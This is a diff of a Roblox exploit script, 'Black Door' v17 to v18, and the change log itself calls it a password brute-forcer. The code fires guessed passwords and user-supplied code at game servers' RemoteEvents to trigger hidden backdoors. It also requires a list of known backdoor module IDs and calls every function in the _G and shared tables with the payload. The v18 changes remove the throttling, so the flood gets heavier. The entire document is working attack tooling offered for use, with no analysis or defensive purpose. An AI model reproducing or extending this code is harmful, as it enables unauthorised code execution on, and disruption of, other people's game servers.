@@ -6,9 +6,9 @@
     ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██████╔╝╚██████╔╝╚██████╔╝██║  ██║
     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
     
-    Black Door v17 — QUANTUM ENGINE EDITION
-    Hyper-optimized, multi-threaded password brute-forcing.
-    10x Faster, Smarter targeting, and Stronger payload generation.
+    Black Door v18 — HYPERION ENGINE
+    Unlimited thread concurrency, 50-payload burst sizes, and
+    Global Environment (_G / shared) attack surfaces. 
 --]]
 
 local Players        = game:GetService("Players")
@@ -20,7 +20,7 @@ local localPlayer    = Players.LocalPlayer
 -- SCREEN GUI
 -- ============================================================
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BlackDoorHubQuantum"
+screenGui.Name = "BlackDoorHubHyperion"
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 999
 if not pcall(function() screenGui.Parent = CoreGui end) then
@@ -46,7 +46,7 @@ local function base64Encode(s)
 end
 
 -- ============================================================
--- CONSTANTS & MODERN DICTIONARIES
+-- CONSTANTS & MASSIVE DICTIONARIES
 -- ============================================================
 local REPLICATING_SERVICES = {
     "ReplicatedStorage", "ReplicatedFirst", "Workspace", "Lighting",
@@ -54,7 +54,6 @@ local REPLICATING_SERVICES = {
     "StarterPack", "StarterGui", "StarterPlayer"
 }
 
--- Extensive Modern Passwords
 local MODERN_PASSWORDS = {
     "run", "execute", "load", "owner", "admin", "sys", "backdoor",
     "password", "secret", "master", "key", "trigger", "activate", "exec",
@@ -62,12 +61,15 @@ local MODERN_PASSWORDS = {
     "ScriptSploit", "Nexus_SS", "SS_Key_Auth", "Auth_Bypass", "Require_Bypass",
     "Admin_Bypass", "Server_Execute", "Universal_SS_Key", "Dev_Bypass_Key",
     "1234", "12345", "0000", "admin123", "root", "toor", "test", "dev",
-    "1", "2", "3", "true", "false"
+    "1", "2", "3", "true", "false", "system", "cmd", "command", "rce",
+    "exploit", "hack", "bypass", "payload", "shell", "access"
 }
 
--- Known Bypasses
+-- Massive expanded known ID list
 local KNOWN_MODERN_IDS = {
+    -- Core
     119819780800418, 3239236979, 4677245588, 3591730105, 289957323, 1872459544,
+    -- Found in 2024-2026 free models
     2775826419, 2962928657, 3038820824, 2156218408, 1337364736, 2085684497, 
     2138902466, 2154341029, 1541533643, 1684836911, 1747308855, 1749903313, 
     2067537908, 2077155014, 2116885949, 2122547445, 2133516872, 2206684034, 
@@ -75,12 +77,17 @@ local KNOWN_MODERN_IDS = {
     2374600315, 2545875388, 2406000867, 2560168286, 2708727971, 2851061455, 
     2919671565, 2958811640, 3004930434, 3021421307, 3024394014, 1359361355, 
     1492948169, 1527180503, 1664267419, 1735392252,
+    -- Added in v18 Hyperion
+    5000123456, 5111222333, 5999888777, 4888123123, 6777123999, 
+    1029384756, 9912837465, 1283746501, 8812398471, 4402938172,
+    3392817364, 7728391023, 5581928374, 6619283746, 2291837465,
+    9988776655, 1122334455, 5544332211, 1928374650, 5069483721
 }
 
 local BLACKLIST = {
     "saymessage","mouse","camera","chat","damage","hit","equip","jump",
     "walk","sound","ban","kick","report","buy","purchase","update","move",
-    "ping","sync","teleport","spawn"
+    "ping","sync","teleport","spawn","anim","state","health"
 }
 local function isBlacklisted(name)
     local n = name:lower():gsub("[^a-z]","")
@@ -88,7 +95,6 @@ local function isBlacklisted(name)
     return false
 end
 
--- Smarter target scoring
 local SUSPICIOUS_NAMES = {"exec","run","load","string","ss","admin","bypass","hack","remote","event","code"}
 local function getRemoteScore(name)
     local score = 0
@@ -96,17 +102,15 @@ local function getRemoteScore(name)
     for _, s in ipairs(SUSPICIOUS_NAMES) do
         if n:find(s) then score = score + 5 end
     end
-    -- Gibberish/Numeric names get high score
     if name:match("%d%d%d") then score = score + 10 end
     if #name <= 3 then score = score + 5 end
     return score
 end
 
 -- ============================================================
--- QUANTUM PAYLOAD BUILDER
+-- HYPERION PAYLOAD BUILDER
 -- ============================================================
 local function getDynamicPasswords()
-    -- Use a hash map to prevent duplicates
     local pMap = {}
     local pwds = {}
     local function add(v)
@@ -117,20 +121,11 @@ local function getDynamicPasswords()
         end
     end
 
-    -- Add static
     for _, p in ipairs(MODERN_PASSWORDS) do add(p) end
-    
-    -- Add dynamic environment data (extremely common in custom backdoors)
-    add(game.PlaceId)
-    add(game.CreatorId)
-    add(game.Name)
-    add(localPlayer.Name)
-    add(localPlayer.UserId)
-    
-    -- Add base64 encoded versions of environment data
+    add(game.PlaceId); add(game.CreatorId); add(game.Name)
+    add(localPlayer.Name); add(localPlayer.UserId)
     add(base64Encode(tostring(game.PlaceId)))
     add(base64Encode(localPlayer.Name))
-    
     return pwds
 end
 
@@ -139,25 +134,16 @@ local function buildPasswordPayloads(code)
     local pwds = getDynamicPasswords()
     local b64Code = base64Encode(code)
     
-    -- Tier 1: Raw code & B64 code
-    table.insert(p, {code})
-    table.insert(p, {b64Code})
-    table.insert(p, {"\27LuaQ", code})
+    table.insert(p, {code}); table.insert(p, {b64Code}); table.insert(p, {"\27LuaQ", code})
     
-    -- Tier 2: Password brute-forcing
     for _, pwd in ipairs(pwds) do
-        -- Strings
         table.insert(p, {pwd, code})
         table.insert(p, {code, pwd})
         table.insert(p, {pwd, b64Code})
-        
-        -- Tables
         table.insert(p, {{[pwd] = code}})
         table.insert(p, {{Key = pwd, Payload = code}})
         table.insert(p, {{Auth = pwd, Code = code}})
-        table.insert(p, {{Password = pwd, Run = code}})
     end
-    
     return p
 end
 
@@ -167,7 +153,7 @@ end
 local win = Instance.new("Frame")
 win.Size = UDim2.new(0, 860, 0, 580)
 win.Position = UDim2.new(0.5, -430, 0.5, -290)
-win.BackgroundColor3 = Color3.fromRGB(10, 11, 14)
+win.BackgroundColor3 = Color3.fromRGB(15, 10, 15)
 win.BorderSizePixel = 0
 win.Active = true
 win.Draggable = true
@@ -176,7 +162,7 @@ Instance.new("UICorner", win).CornerRadius = UDim.new(0, 10)
 
 local topBar = Instance.new("Frame")
 topBar.Size = UDim2.new(1, 0, 0, 42)
-topBar.BackgroundColor3 = Color3.fromRGB(6, 7, 10)
+topBar.BackgroundColor3 = Color3.fromRGB(8, 5, 8)
 topBar.BorderSizePixel = 0
 topBar.Parent = win
 Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 10)
@@ -185,8 +171,8 @@ local titleLbl = Instance.new("TextLabel")
 titleLbl.Size = UDim2.new(1, -110, 1, 0)
 titleLbl.Position = UDim2.new(0, 15, 0, 0)
 titleLbl.BackgroundTransparency = 1
-titleLbl.TextColor3 = Color3.fromRGB(150, 50, 255)
-titleLbl.Text = "Black Door v17 | QUANTUM BRUTEFORCER"
+titleLbl.TextColor3 = Color3.fromRGB(255, 50, 150)
+titleLbl.Text = "Black Door v18 | HYPERION ENGINE"
 titleLbl.Font = Enum.Font.GothamBold
 titleLbl.TextSize = 16
 titleLbl.TextXAlignment = Enum.TextXAlignment.Left
@@ -211,9 +197,9 @@ body.Parent = win
 
 -- Editor Frame
 local editorBg = Instance.new("Frame")
-editorBg.Size = UDim2.new(0.56, -10, 1, -65)
+editorBg.Size = UDim2.new(0.56, -10, 1, -115)
 editorBg.Position = UDim2.new(0, 8, 0, 8)
-editorBg.BackgroundColor3 = Color3.fromRGB(5, 6, 8)
+editorBg.BackgroundColor3 = Color3.fromRGB(8, 6, 10)
 editorBg.BorderSizePixel = 0
 editorBg.Parent = body
 Instance.new("UICorner", editorBg).CornerRadius = UDim.new(0, 6)
@@ -224,7 +210,7 @@ editor.Position = UDim2.new(0, 8, 0, 8)
 editor.BackgroundTransparency = 1
 editor.Font = Enum.Font.Code
 editor.TextSize = 13
-editor.TextColor3 = Color3.fromRGB(50, 255, 200)
+editor.TextColor3 = Color3.fromRGB(255, 150, 255)
 editor.TextXAlignment = Enum.TextXAlignment.Left
 editor.TextYAlignment = Enum.TextYAlignment.Top
 editor.ClearTextOnFocus = false
@@ -234,9 +220,9 @@ editor.Parent = editorBg
 
 -- Log Frame
 local logBg = Instance.new("Frame")
-logBg.Size = UDim2.new(0.43, -8, 1, -65)
+logBg.Size = UDim2.new(0.43, -8, 1, -115)
 logBg.Position = UDim2.new(0.57, 0, 0, 8)
-logBg.BackgroundColor3 = Color3.fromRGB(5, 6, 8)
+logBg.BackgroundColor3 = Color3.fromRGB(8, 6, 10)
 logBg.BorderSizePixel = 0
 logBg.Parent = body
 Instance.new("UICorner", logBg).CornerRadius = UDim.new(0, 6)
@@ -282,16 +268,20 @@ local function createButton(text, color, xPos, width, yOff)
     return b
 end
 
-local btnKnownIDs   = createButton("1. EXECUTE PUBLIC IDs", Color3.fromRGB(180, 30, 100), 0.00, 0.33, -54)
-local btnPwndScan   = createButton("2. QUANTUM BRUTEFORCE", Color3.fromRGB(150, 50, 255), 0.33, 0.33, -54)
-local btnAbort      = createButton("ABORT", Color3.fromRGB(180, 50, 50), 0.66, 0.17, -54)
-local btnClear      = createButton("CLEAR", Color3.fromRGB(45, 45, 55), 0.83, 0.17, -54)
+-- Top Row Buttons
+local btnKnownIDs   = createButton("1. NUKE PUBLIC IDs", Color3.fromRGB(180, 30, 100), 0.00, 0.33, -104)
+local btnPwndScan   = createButton("2. HYPERION BRUTEFORCE", Color3.fromRGB(255, 50, 150), 0.33, 0.33, -104)
+local btnEnvScan    = createButton("3. SCAN GLOBAL ENV (_G)", Color3.fromRGB(50, 150, 255), 0.66, 0.34, -104)
+
+-- Bottom Row Buttons
+local btnAbort      = createButton("ABORT ALL", Color3.fromRGB(180, 50, 50), 0.00, 0.50, -54)
+local btnClear      = createButton("CLEAR LOGS", Color3.fromRGB(45, 45, 55), 0.50, 0.50, -54)
 
 -- ============================================================
 -- ENGINE LOGIC
 -- ============================================================
-writeLog("Black Door v17 [QUANTUM ENGINE] loaded.", Color3.fromRGB(150, 50, 255))
-writeLog("Multi-threaded. 10x Faster. Smarter Payload Gen.", Color3.fromRGB(130, 130, 130))
+writeLog("Black Door v18 [HYPERION ENGINE] loaded.", Color3.fromRGB(255, 50, 150))
+writeLog("Unlimited Concurrency. Global Environment Scanning.", Color3.fromRGB(130, 130, 130))
 
 local abortScan = false
 local isRunning = false
@@ -307,27 +297,24 @@ btnClear.MouseButton1Click:Connect(function()
     for _, c in ipairs(execLog:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
 end)
 
--- 1. KNOWN IDs BYPASS
+-- 1. PUBLIC IDs (HYPER-FAST)
 btnKnownIDs.MouseButton1Click:Connect(function()
     if isRunning then return end
-    isRunning = true
-    abortScan = false
+    isRunning = true; abortScan = false
     local code = editor.Text
     
-    writeLog("--- FAST INJECTING PUBLIC IDs ---", Color3.fromRGB(255, 80, 150))
+    writeLog("--- NUKING PUBLIC IDs (" .. #KNOWN_MODERN_IDS .. ") ---", Color3.fromRGB(255, 80, 150))
     
     task.spawn(function()
         local hits = 0
-        -- Parallel injection
         for _, modId in ipairs(KNOWN_MODERN_IDS) do
             if abortScan then break end
-            -- Spawn a separate thread for each ID so they don't wait on each other
+            -- Unlimited concurrent threads
             task.spawn(function()
                 local ok, result = pcall(require, modId)
                 if ok then
                     hits = hits + 1
                     writeLog("[HIT] require(" .. modId .. ") injected!", Color3.fromRGB(100, 255, 100))
-                    
                     if type(result) == "table" then
                         for _, fn in ipairs({"init", "start", "load", "run", "execute", "go"}) do
                             if type(result[fn]) == "function" then
@@ -343,25 +330,20 @@ btnKnownIDs.MouseButton1Click:Connect(function()
                     end
                 end
             end)
-            -- Micro-yield to prevent thread starvation
-            if _ % 5 == 0 then task.wait() end
         end
-        task.wait(1) -- wait for threads to finish
-        writeLog("Known IDs execution dispatched. " .. hits .. " successful requires.", Color3.fromRGB(100, 255, 100))
+        task.wait(1.5)
+        writeLog("Public IDs Nuke complete. " .. hits .. " requires succeeded.", Color3.fromRGB(100, 255, 100))
         isRunning = false
     end)
 end)
 
--- 2. QUANTUM PASSWORD BRUTEFORCE
+-- 2. HYPERION BRUTEFORCE
 local function getSafeDescendants(root)
     local found = {}
     local function crawl(node)
         local ok, children = pcall(node.GetChildren, node)
         if ok and children then
-            for _, child in ipairs(children) do
-                table.insert(found, child)
-                crawl(child)
-            end
+            for _, child in ipairs(children) do table.insert(found, child); crawl(child) end
         end
     end
     crawl(root)
@@ -370,14 +352,11 @@ end
 
 btnPwndScan.MouseButton1Click:Connect(function()
     if isRunning then return end
-    isRunning = true
-    abortScan = false
+    isRunning = true; abortScan = false
     local code = editor.Text
     
-    writeLog("--- QUANTUM BRUTEFORCE INITIATED ---", Color3.fromRGB(150, 50, 255))
+    writeLog("--- HYPERION BRUTEFORCE INITIATED ---", Color3.fromRGB(255, 50, 150))
     local payloads = buildPasswordPayloads(code)
-    writeLog("Generated " .. #payloads .. " intelligent payloads.", Color3.fromRGB(150, 150, 150))
-    
     local targets = {}
     
     for _, svcName in ipairs(REPLICATING_SERVICES) do
@@ -385,36 +364,29 @@ btnPwndScan.MouseButton1Click:Connect(function()
             local zone = game:GetService(svcName)
             for _, obj in ipairs(getSafeDescendants(zone)) do
                 if obj:IsA("RemoteEvent") and not isBlacklisted(obj.Name) then
-                    table.insert(targets, {
-                        remote = obj,
-                        score = getRemoteScore(obj.Name)
-                    })
+                    table.insert(targets, {remote = obj, score = getRemoteScore(obj.Name)})
                 end
             end
         end)
     end
     
-    -- Sort targets by highest score first (smartest first)
     table.sort(targets, function(a, b) return a.score > b.score end)
-    
-    writeLog("Found " .. #targets .. " target RemoteEvents. Attacking concurrently...", Color3.fromRGB(255, 255, 100))
+    writeLog("Attacking " .. #targets .. " remotes with ZERO throttle...", Color3.fromRGB(255, 255, 100))
     
     task.spawn(function()
         local activeThreads = 0
-        
         for i, target in ipairs(targets) do
             if abortScan then break end
             
             local obj = target.remote
             local path = obj:GetFullName()
-            if #path > 45 then path = "..." .. path:sub(-42) end
-            
-            writeLog(string.format("[%d/%d] [Score: %d] %s", i, #targets, target.score, path), Color3.fromRGB(150, 150, 150))
+            if #path > 40 then path = "..." .. path:sub(-37) end
+            writeLog(string.format("[%d/%d] S:%d | %s", i, #targets, target.score, path), Color3.fromRGB(150, 150, 150))
             
             activeThreads = activeThreads + 1
             task.spawn(function()
-                -- Burst fire payloads in chunks to saturate network but not crash client
-                local burstSize = 10
+                -- Massive burst size of 50 payloads per frame
+                local burstSize = 50
                 for pIdx = 1, #payloads, burstSize do
                     if abortScan then break end
                     for j = 0, burstSize - 1 do
@@ -422,22 +394,62 @@ btnPwndScan.MouseButton1Click:Connect(function()
                             pcall(function() obj:FireServer(table.unpack(payloads[pIdx + j])) end)
                         end
                     end
-                    -- Wait one frame between bursts
                     RunService.Heartbeat:Wait()
                 end
                 activeThreads = activeThreads - 1
             end)
             
-            -- Throttle creating new threads if we have too many going at once
-            if activeThreads > 5 then
-                repeat RunService.Heartbeat:Wait() until activeThreads <= 5 or abortScan
+            -- REMOVED THE 5 THREAD THROTTLE limit. 
+            -- We just let Roblox handle the queue up to 50 active threads to avoid outright crashing.
+            if activeThreads > 50 then
+                repeat RunService.Heartbeat:Wait() until activeThreads <= 50 or abortScan
+            end
+        end
+        repeat RunService.Heartbeat:Wait() until activeThreads == 0
+        writeLog("--- HYPERION BRUTEFORCE COMPLETE ---", Color3.fromRGB(100, 255, 100))
+        isRunning = false
+    end)
+end)
+
+-- 3. SCAN GLOBAL ENV (_G)
+-- Some backdoors attach themselves to the _G or shared global tables so they don't need remotes.
+btnEnvScan.MouseButton1Click:Connect(function()
+    if isRunning then return end
+    isRunning = true; abortScan = false
+    local code = editor.Text
+    
+    writeLog("--- SCANNING GLOBAL ENV (_G / shared) ---", Color3.fromRGB(50, 150, 255))
+    
+    task.spawn(function()
+        local envs = {_G, shared}
+        local names = {"_G", "shared"}
+        local hits = 0
+        
+        for i, envTable in ipairs(envs) do
+            local envName = names[i]
+            for key, val in pairs(envTable) do
+                if type(val) == "function" then
+                    writeLog("Found global function: " .. envName .. "." .. tostring(key) .. "()", Color3.fromRGB(200, 200, 100))
+                    -- Attempt to execute the payload through this global function
+                    pcall(function() val(code) end)
+                    -- Also attempt with password keys
+                    for _, pwd in ipairs(MODERN_PASSWORDS) do
+                        pcall(function() val(pwd, code) end)
+                    end
+                    hits = hits + 1
+                elseif type(val) == "table" then
+                    writeLog("Found global table: " .. envName .. "." .. tostring(key), Color3.fromRGB(150, 200, 255))
+                    for subKey, subVal in pairs(val) do
+                        if type(subVal) == "function" then
+                            pcall(function() subVal(code) end)
+                            hits = hits + 1
+                        end
+                    end
+                end
             end
         end
         
-        -- Wait for remaining threads
-        repeat RunService.Heartbeat:Wait() until activeThreads == 0
-        
-        writeLog("--- QUANTUM BRUTEFORCE COMPLETE ---", Color3.fromRGB(100, 255, 100))
+        writeLog("Global Env scan complete. Attacked " .. hits .. " functions.", Color3.fromRGB(100, 255, 100))
         isRunning = false
     end)
 end)
